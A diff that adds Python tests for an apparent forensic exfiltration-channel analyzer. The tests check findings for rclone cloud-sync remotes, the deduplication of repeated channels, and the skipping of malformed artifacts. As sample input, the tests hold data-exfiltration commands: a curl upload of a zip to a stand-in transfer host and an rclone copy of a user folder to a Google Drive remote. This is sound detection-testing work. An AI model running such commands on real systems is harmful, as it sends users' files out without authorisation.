@@ -140,3 +140,84 @@ def test_transfer_severity_follows_60_minute_ai_window(
     findings = _findings(store)
     assert len(findings) == 1
     assert findings[0].severity is expected
+
+
+def test_cloud_sync_finding_names_the_rclone_remote(store: CaseStore) -> None:
+    store.add(
+        [
+            _art(
+                "cs1",
+                ArtifactKind.CLOUD_SYNC,
+                {"service": "drive", "account": "gdrive", "extra": {"tool": "rclone", "remote_name": "gdrive"}},
+            ),
+            _event("cs1", T0, category=EventCategory.CONFIG, actor=Actor.UNKNOWN),
+        ]
+    )
+    (finding,) = _findings(store)
+    assert finding.title == "Exfiltration channel: rclone remote gdrive (drive)"
+    assert "gdrive" in finding.data["channel"]
+    assert "gdrive" in finding.data["destination"]
+    assert "gdrive" in finding.narrative
+
+
+def test_same_channel_from_two_artifacts_yields_one_finding(store: CaseStore) -> None:
+    command = "curl -T /home/park/a.zip https://transfer.example.net/upload"
+    store.add([*_shell("sh1", command, T0), *_shell("sh2", command, T0 + timedelta(minutes=1))])
+    findings = _findings(store)
+    assert len(findings) == 1
+    assert set(findings[0].artifact_ids) == {"sh1", "sh2"}
+    assert len(findings[0].event_ids) == 2
+
+
+def test_shell_command_and_derived_file_transfer_yield_one_finding(store: CaseStore) -> None:
+    command = r"rclone copy C:\Users\kim\work gdrive:backup"
+    transfer = _art(
+        "ft1",
+        ArtifactKind.FILE_TRANSFER,
+        {
+            "channel": "TR-RCLONE",
+            "direction": "upload",
+            "local_paths": [r"C:\Users\kim\work"],
+            "destination": "gdrive:backup",
+            "command": command,
+        },
+    )
+    store.add(
+        [
+            *_shell("sh1", command, T0),
+            transfer,
+            _event("ft1", T0, category=EventCategory.TRANSFER, actor=Actor.HUMAN),
+        ]
+    )
+    findings = _findings(store)
+    assert len(findings) == 1
+    assert findings[0].title == "Exfiltration channel: TR-RCLONE to gdrive:backup"
+    assert set(findings[0].artifact_ids) == {"sh1", "ft1"}
+
+
+def _good_records() -> list[Artifact | Event]:
+    return _shell("s1", SCP_PROPOSAL, T0)
+
+
+def _bad_records() -> list[Artifact | Event]:
+    return [
+        _art("bad-missing", ArtifactKind.SHELL_COMMAND, {"shell": "bash", "tags": [], "rule_ids": []}),
+        _art("bad-type", ArtifactKind.SHELL_COMMAND, {"shell": "bash", "command": 42}),
+    ]
+
+
+
+def test_malformed_artifacts_are_skipped_and_reported(store: CaseStore) -> None:
+    store.add(_good_records())
+    baseline = list(ANALYZER.run(store, "UTC"))
+    assert not [f for f in baseline if isinstance(f, Finding) and f.category is FindingCategory.COVERAGE]
+
+    store.add(_bad_records())
+    result = list(ANALYZER.run(store, "UTC"))  # must not raise
+
+    coverage = [f for f in result if isinstance(f, Finding) and f.category is FindingCategory.COVERAGE]
+    assert [item for item in result if item not in coverage] == baseline
+    assert len(coverage) == 1
+    assert coverage[0].severity is Severity.LOW
+    assert coverage[0].title == "exfil_channels: skipped 2 malformed artifacts"
+    assert coverage[0].data["artifact_ids"] == ["bad-missing", "bad-type"]
